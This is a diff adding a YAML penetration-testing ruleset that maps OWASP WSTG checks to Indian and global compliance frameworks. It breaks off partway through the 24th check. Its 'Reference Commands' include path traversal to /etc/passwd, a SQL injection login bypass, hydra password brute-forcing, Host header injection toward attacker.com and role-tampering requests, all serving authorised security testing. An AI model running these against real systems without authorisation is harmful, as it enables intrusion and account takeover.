@@ -1,0 +1,2629 @@
+schema_version: "1.0.0"
+tool_suite: "TIRweb"
+metadata:
+  description: "TIRweb Full OWASP WSTG v4.2 (99 Checks) Ruleset Converted from Book1.xlsx with Indian & Global Regulatory Mappings"
+  supported_profiles:
+    - "core"
+    - "bfsi_fintech"
+    - "saas_multitenant"
+    - "healthcare_pii"
+    - "ecommerce"
+
+modules:
+  - module_id: "TIR-IAM"
+    name: "Identity, Access Control & Session Engine"
+    checks:
+      - id: "WEB-IAM-001"
+        title: "[WSTG-IDNT-01] Test Role Definitions"
+        category: "Identity Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii"]
+        test_procedures:
+          - "Objective: Verify roles are clearly separated with least privilege."
+          - "Enumerate all defined roles."
+          - "Map permissions per role."
+          - "Test for overlapping/excessive privileges between roles."
+          - "Expected Secure Result: Roles enforce least privilege with no unintended overlaps."
+          - "Reference Commands: Manual review with test accounts per role via Burp Suite"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Identity & Least-Privilege Access Control)"
+            - "CERT-In CISG-2024-01 (Identity & Provisioning Governance)"
+            - "OWASP WSTG v4.2: WSTG-IDNT-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-IDNT-01"
+            - "OWASP Top 10: A01 Broken Access Control / A07 Auth Failures"
+            - "PCI DSS v4.0: Req. 7.2, 8.2"
+            - "ISO 27001:2022: A.5.15, A.8.2, A.8.3"
+            - "SOC 2: CC6.1, CC6.2"
+
+      - id: "WEB-IAM-002"
+        title: "[WSTG-IDNT-02] Test User Registration Process"
+        category: "Identity Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify registration validates identity and prevents abuse."
+          - "Register with valid/invalid data."
+          - "Test duplicate registration."
+          - "Test email verification bypass."
+          - "Test automated/bulk registration (CAPTCHA)."
+          - "Expected Secure Result: Registration validates identity properly; rate-limited; verification cannot be bypassed."
+          - "Reference Commands: curl -X POST https://target.com/register -d 'email=test@test.com&pass=Test123!' | Burp Intruder for bulk registration test"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Identity & Least-Privilege Access Control)"
+            - "CERT-In CISG-2024-01 (Identity & Provisioning Governance)"
+            - "OWASP WSTG v4.2: WSTG-IDNT-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-IDNT-02"
+            - "OWASP Top 10: A01 Broken Access Control / A07 Auth Failures"
+            - "PCI DSS v4.0: Req. 7.2, 8.2"
+            - "ISO 27001:2022: A.5.15, A.8.2, A.8.3"
+            - "SOC 2: CC6.1, CC6.2"
+
+      - id: "WEB-IAM-003"
+        title: "[WSTG-IDNT-03] Test Account Provisioning Process"
+        category: "Identity Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii"]
+        test_procedures:
+          - "Objective: Verify accounts are provisioned only by authorized parties."
+          - "Review who can create accounts (self-service vs admin)."
+          - "Test for unauthorized provisioning/privilege assignment during signup."
+          - "Expected Secure Result: Only authorized entities can provision accounts/roles."
+          - "Reference Commands: Manual review of provisioning workflow; parameter tampering on role field during signup"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Identity & Least-Privilege Access Control)"
+            - "CERT-In CISG-2024-01 (Identity & Provisioning Governance)"
+            - "OWASP WSTG v4.2: WSTG-IDNT-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-IDNT-03"
+            - "OWASP Top 10: A01 Broken Access Control / A07 Auth Failures"
+            - "PCI DSS v4.0: Req. 7.2, 8.2"
+            - "ISO 27001:2022: A.5.15, A.8.2, A.8.3"
+            - "SOC 2: CC6.1, CC6.2"
+
+      - id: "WEB-IAM-004"
+        title: "[WSTG-IDNT-04] Test Account Enumeration & Guessable Accounts"
+        category: "Identity Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Determine if usernames/emails can be enumerated via app responses."
+          - "Test login/registration/password-reset with valid & invalid usernames."
+          - "Compare response messages/timing."
+          - "Automate check with wordlist."
+          - "Expected Secure Result: Identical responses/timing for valid & invalid accounts; no enumeration possible."
+          - "Reference Commands: ffuf -u https://target.com/login -d 'user=FUZZ&pass=x' -w usernames.txt -fc 200 | Burp Intruder comparing response length/timing"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Identity & Least-Privilege Access Control)"
+            - "CERT-In CISG-2024-01 (Identity & Provisioning Governance)"
+            - "OWASP WSTG v4.2: WSTG-IDNT-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-IDNT-04"
+            - "OWASP Top 10: A01 Broken Access Control / A07 Auth Failures"
+            - "PCI DSS v4.0: Req. 7.2, 8.2"
+            - "ISO 27001:2022: A.5.15, A.8.2, A.8.3"
+            - "SOC 2: CC6.1, CC6.2"
+
+      - id: "WEB-IAM-005"
+        title: "[WSTG-IDNT-05] Test Weak/Unenforced Username Policy"
+        category: "Identity Management"
+        severity: "Low"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check if usernames follow predictable patterns (e.g. sequential IDs, emails as usernames)."
+          - "Review username generation logic."
+          - "Test predictability of usernames/IDs."
+          - "Expected Secure Result: Usernames are not predictable/sequential; no PII exposed as username."
+          - "Reference Commands: Manual review; sequential ID testing via Burp Repeater"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Identity & Least-Privilege Access Control)"
+            - "CERT-In CISG-2024-01 (Identity & Provisioning Governance)"
+            - "OWASP WSTG v4.2: WSTG-IDNT-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-IDNT-05"
+            - "OWASP Top 10: A01 Broken Access Control / A07 Auth Failures"
+            - "PCI DSS v4.0: Req. 7.2, 8.2"
+            - "ISO 27001:2022: A.5.15, A.8.2, A.8.3"
+            - "SOC 2: CC6.1, CC6.2"
+
+      - id: "WEB-IAM-006"
+        title: "[WSTG-IDNT-06] Test Permissions of Guest/Unauthenticated Users"
+        category: "Identity Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify unauthenticated users cannot access restricted functionality."
+          - "Access authenticated-only endpoints without a session/token."
+          - "Attempt direct object access."
+          - "Expected Secure Result: All protected resources return 401/403 for unauthenticated requests."
+          - "Reference Commands: curl https://target.com/api/user/profile (no auth header) | curl https://target.com/admin/dashboard"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Identity & Least-Privilege Access Control)"
+            - "CERT-In CISG-2024-01 (Identity & Provisioning Governance)"
+            - "OWASP WSTG v4.2: WSTG-IDNT-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-IDNT-06"
+            - "OWASP Top 10: A01 Broken Access Control / A07 Auth Failures"
+            - "PCI DSS v4.0: Req. 7.2, 8.2"
+            - "ISO 27001:2022: A.5.15, A.8.2, A.8.3"
+            - "SOC 2: CC6.1, CC6.2"
+
+      - id: "WEB-IAM-007"
+        title: "[WSTG-ATHN-01] Test Credentials Transported over Encrypted Channel"
+        category: "Authentication Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Ensure credentials are never sent over unencrypted channels."
+          - "Intercept login traffic with proxy."
+          - "Verify HTTPS enforced for all auth traffic."
+          - "Check for HTTP fallback/mixed content."
+          - "Expected Secure Result: All credential submissions occur exclusively over TLS; no HTTP fallback."
+          - "Reference Commands: Burp Suite proxy intercept on login | curl -I http://target.com/login (check redirect to https)"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-01"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-008"
+        title: "[WSTG-ATHN-02] Test Default Credentials"
+        category: "Authentication Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_auth"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check for default/vendor-supplied credentials still active."
+          - "Identify platform/CMS/device in use."
+          - "Attempt known default credential pairs."
+          - "Document any successful login."
+          - "Expected Secure Result: No default credentials are active on any account."
+          - "Reference Commands: hydra -L defaults_users.txt -P defaults_pass.txt target.com http-post-form | Manual test: admin/admin, admin/password"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-02"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-009"
+        title: "[WSTG-ATHN-03] Test Weak Lock Out Mechanism"
+        category: "Authentication Testing"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_auth"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify account lockout/rate limiting exists after failed attempts."
+          - "Attempt multiple failed logins for a valid user."
+          - "Observe lockout threshold/duration."
+          - "Test lockout bypass (X-Forwarded-For, different IP)."
+          - "Expected Secure Result: Account locks/rate-limits after N failed attempts; lockout cannot be trivially bypassed."
+          - "Reference Commands: hydra -l victim@test.com -P rockyou.txt target.com http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect' | Burp Intruder with header spoofing"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-03"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-010"
+        title: "[WSTG-ATHN-04] Test for Bypassing Authentication Schema"
+        category: "Authentication Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_auth"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Attempt to bypass login via parameter tampering, forced browsing, SQLi."
+          - "Try forced browsing to authenticated pages."
+          - "Try SQL injection in login fields."
+          - "Test parameter manipulation (e.g. isAdmin=true)."
+          - "Test session prediction."
+          - "Expected Secure Result: Authentication cannot be bypassed via any tested technique."
+          - "Reference Commands: ' OR '1'='1'-- - (in username field) | curl https://target.com/dashboard (no session) | Burp Repeater param tampering"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-04"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-011"
+        title: "[WSTG-ATHN-05] Test Remember Password Functionality"
+        category: "Authentication Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify 'remember me' doesn't store credentials insecurely."
+          - "Enable remember-me and inspect cookies/local storage."
+          - "Check token expiry and storage format (plaintext vs hashed)."
+          - "Expected Secure Result: Remember-me token is random, non-guessable, and expires appropriately; no plaintext creds stored."
+          - "Reference Commands: Browser DevTools > Application > Cookies/Storage | Burp Suite - inspect Set-Cookie header"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-05"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-05"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-012"
+        title: "[WSTG-ATHN-06] Test Browser Cache Weaknesses"
+        category: "Authentication Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify sensitive pages aren't cached by the browser."
+          - "Login and browse authenticated pages."
+          - "Logout, then use browser back button."
+          - "Check Cache-Control/Pragma headers on sensitive pages."
+          - "Expected Secure Result: Cache-Control: no-store set on all sensitive/authenticated pages."
+          - "Reference Commands: curl -I https://target.com/account -H 'Cookie: session=...' | grep -i cache-control"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-06"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-06"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-013"
+        title: "[WSTG-ATHN-07] Test Weak Password Policy"
+        category: "Authentication Testing"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify password complexity/length requirements are enforced."
+          - "Attempt to set weak passwords (123456, password)."
+          - "Test minimum length enforcement."
+          - "Check against breached-password list rejection."
+          - "Expected Secure Result: Weak/common passwords rejected; policy enforces length/complexity and breach-list check."
+          - "Reference Commands: curl -X POST https://target.com/register -d 'password=123456'"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-07"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-07"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-014"
+        title: "[WSTG-ATHN-08] Test Weak Security Question/Answer"
+        category: "Authentication Testing"
+        severity: "Low"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify security questions aren't easily guessable/researchable."
+          - "Review available security questions."
+          - "Assess if answers are publicly discoverable (OSINT)."
+          - "Expected Secure Result: Security questions (if used) are not easily OSINT-able; MFA preferred over questions."
+          - "Reference Commands: Manual review of security question options"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-08"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-08"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-015"
+        title: "[WSTG-ATHN-09] Test Weak Password Change/Reset Functionalities"
+        category: "Authentication Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify password reset process cannot be abused (token reuse, host header injection, no old-password check)."
+          - "Request password reset and inspect token (randomness/expiry)."
+          - "Test token reuse after use."
+          - "Test Host Header Injection in reset link."
+          - "Verify old-password required for change."
+          - "Expected Secure Result: Reset tokens are single-use, random, short-lived; Host header injection not possible; old password required for change."
+          - "Reference Commands: curl -X POST https://target.com/forgot-password -d 'email=victim@test.com' -H 'Host: attacker.com' | Burp Repeater - reuse reset token after consumption"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-09"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-09"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-016"
+        title: "[WSTG-ATHN-10] Test Weaker Authentication in Alternative Channel"
+        category: "Authentication Testing"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Check if mobile/API/legacy channels use weaker auth than the main web app."
+          - "Identify all channels (mobile app API, legacy endpoints)."
+          - "Compare auth mechanisms/strength across channels."
+          - "Expected Secure Result: All channels enforce equivalent authentication strength."
+          - "Reference Commands: mitmproxy for mobile API traffic analysis | Postman for API endpoint testing"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-10"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-10"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-017"
+        title: "[WSTG-ATHN-11] Testing Multi-Factor Authentication (MFA)"
+        category: "Authentication Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify MFA implementation cannot be bypassed."
+          - "Test MFA code brute-force/rate limiting."
+          - "Test replay of used OTP."
+          - "Test bypass by direct navigation to post-auth pages."
+          - "Test backup-code weaknesses."
+          - "Expected Secure Result: MFA cannot be bypassed, brute-forced, or replayed; enforced on all sensitive actions."
+          - "Reference Commands: Burp Intruder on OTP field (rate-limit test) | curl https://target.com/dashboard (skip MFA step)"
+        compliance:
+          india:
+            - "RBI Digital Payment Security Controls (Mandatory 2FA & Credential Hygiene)"
+            - "CERT-In CISG-2024-01 (Authentication Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Authentication Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-ATHN-11"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHN-11"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.3, 8.4"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-018"
+        title: "[WSTG-ATHZ-01] Test Directory Traversal / File Include"
+        category: "Authorization Testing"
+        severity: "Critical"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for path traversal/LFI/RFI vulnerabilities."
+          - "Identify parameters handling file paths."
+          - "Inject traversal payloads."
+          - "Test null byte/encoding bypasses."
+          - "Attempt RFI if applicable."
+          - "Expected Secure Result: No file traversal possible; input validated/sanitized, files restricted to allowed directory."
+          - "Reference Commands: curl 'https://target.com/view?file=../../../../etc/passwd' | curl 'https://target.com/page?file=....//....//etc/passwd' | wfuzz -c -z file,traversal-payloads.txt 'https://target.com/view?file=FUZZ'"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Unauthorized Access Prevention)"
+            - "RBI Digital Payment Security Controls (Customer Data Isolation & RBAC)"
+            - "CERT-In CISG-2024-01 (Server-Side Authorization)"
+            - "OWASP WSTG v4.2: WSTG-ATHZ-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHZ-01"
+            - "OWASP Top 10: A01 Broken Access Control"
+            - "OWASP API Top 10: API1 BOLA / API5 BFLA"
+            - "PCI DSS v4.0: Req. 6.2.4, 7.2"
+            - "ISO 27001:2022: A.8.3, A.8.26"
+            - "SOC 2: CC6.1, CC6.3"
+
+      - id: "WEB-IAM-019"
+        title: "[WSTG-ATHZ-02] Test for Bypassing Authorization Schema"
+        category: "Authorization Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_bfla"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test whether authorization checks can be bypassed (forced browsing, method tampering)."
+          - "Access restricted URL directly as low-priv user."
+          - "Change HTTP method (GET->POST)."
+          - "Manipulate role/permission parameters."
+          - "Expected Secure Result: Authorization enforced server-side regardless of method/direct URL access."
+          - "Reference Commands: curl https://target.com/admin/users -H 'Cookie: session=<lowpriv>' | curl -X POST https://target.com/admin/delete"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Unauthorized Access Prevention)"
+            - "RBI Digital Payment Security Controls (Customer Data Isolation & RBAC)"
+            - "CERT-In CISG-2024-01 (Server-Side Authorization)"
+            - "OWASP WSTG v4.2: WSTG-ATHZ-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHZ-02"
+            - "OWASP Top 10: A01 Broken Access Control"
+            - "OWASP API Top 10: API1 BOLA / API5 BFLA"
+            - "PCI DSS v4.0: Req. 6.2.4, 7.2"
+            - "ISO 27001:2022: A.8.3, A.8.26"
+            - "SOC 2: CC6.1, CC6.3"
+
+      - id: "WEB-IAM-020"
+        title: "[WSTG-ATHZ-03] Test for Privilege Escalation"
+        category: "Authorization Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["nuclei_bfla"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify a lower-privileged user cannot escalate to higher privileges (vertical)."
+          - "Login as low-priv user."
+          - "Attempt to access/modify admin-only functions."
+          - "Tamper with role/isAdmin parameters in requests."
+          - "Expected Secure Result: No privilege escalation possible via parameter tampering or direct access."
+          - "Reference Commands: Burp Repeater - modify JSON body {'role':'admin'} | curl -X PUT https://target.com/api/user/1 -d '{\"role\":\"admin\"}'"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Unauthorized Access Prevention)"
+            - "RBI Digital Payment Security Controls (Customer Data Isolation & RBAC)"
+            - "CERT-In CISG-2024-01 (Server-Side Authorization)"
+            - "OWASP WSTG v4.2: WSTG-ATHZ-03"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHZ-03"
+            - "OWASP Top 10: A01 Broken Access Control"
+            - "OWASP API Top 10: API1 BOLA / API5 BFLA"
+            - "PCI DSS v4.0: Req. 6.2.4, 7.2"
+            - "ISO 27001:2022: A.8.3, A.8.26"
+            - "SOC 2: CC6.1, CC6.3"
+
+      - id: "WEB-IAM-021"
+        title: "[WSTG-ATHZ-04] Test for Insecure Direct Object References (IDOR)"
+        category: "Authorization Testing"
+        severity: "Critical"
+        execution_mode: "hybrid"
+        tool_binding: ["httpx_idor_diff"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify object references (IDs) enforce ownership checks."
+          - "Identify endpoints using object IDs (invoice, profile, order)."
+          - "Change ID to another user's resource as low-priv user."
+          - "Confirm data returned/modified belongs to another user (horizontal escalation)."
+          - "Expected Secure Result: Access denied when object ID belongs to another user; ownership validated server-side."
+          - "Reference Commands: curl https://target.com/api/invoice/1001 -H 'Cookie: session=<userA>' | curl https://target.com/api/invoice/1002 -H 'Cookie: session=<userA>' (belongs to userB)"
+        compliance:
+          india:
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Unauthorized Access Prevention)"
+            - "RBI Digital Payment Security Controls (Customer Data Isolation & RBAC)"
+            - "CERT-In CISG-2024-01 (Server-Side Authorization)"
+            - "OWASP WSTG v4.2: WSTG-ATHZ-04"
+          global:
+            - "OWASP WSTG v4.2: WSTG-ATHZ-04"
+            - "OWASP Top 10: A01 Broken Access Control"
+            - "OWASP API Top 10: API1 BOLA / API5 BFLA"
+            - "PCI DSS v4.0: Req. 6.2.4, 7.2"
+            - "ISO 27001:2022: A.8.3, A.8.26"
+            - "SOC 2: CC6.1, CC6.3"
+
+      - id: "WEB-IAM-022"
+        title: "[WSTG-SESS-01] Test Session Management Schema"
+        category: "Session Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Analyze session token generation for randomness/predictability."
+          - "Capture multiple session tokens."
+          - "Analyze randomness/entropy."
+          - "Test predictability across sessions."
+          - "Expected Secure Result: Session tokens are cryptographically random with high entropy; unpredictable."
+          - "Reference Commands: Burp Sequencer - analyze session token entropy"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-01"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-01"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-023"
+        title: "[WSTG-SESS-02] Test Cookies Attributes"
+        category: "Session Management"
+        severity: "High"
+        execution_mode: "hybrid"
+        tool_binding: ["httpx_headers"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify cookies use Secure, HttpOnly, SameSite attributes."
+          - "Login and capture Set-Cookie headers."
+          - "Verify Secure/HttpOnly/SameSite flags present."
+          - "Check cookie scope (domain/path)."
+          - "Expected Secure Result: All session cookies set with Secure, HttpOnly, and SameSite=Strict/Lax attributes."
+          - "Reference Commands: curl -I https://target.com/login -X POST -d 'user=x&pass=y' | grep -i set-cookie"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Session & Token Lifecycle Security)"
+            - "RBI Digital Payment Security Controls (Session Timeout & Binding)"
+            - "DPDP Rules 2025 - Rule 6(1)(a) & (b) (Session Token Protection)"
+            - "OWASP WSTG v4.2: WSTG-SESS-02"
+          global:
+            - "OWASP WSTG v4.2: WSTG-SESS-02"
+            - "OWASP Top 10: A07 Identification and Authentication Failures"
+            - "PCI DSS v4.0: Req. 8.2.8"
+            - "ISO 27001:2022: A.8.5"
+            - "SOC 2: CC6.1"
+
+      - id: "WEB-IAM-024"
+        title: "[WSTG-SESS-03] Test for Session Fixation"
+        category: "Session Management"
+        severity: "High"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
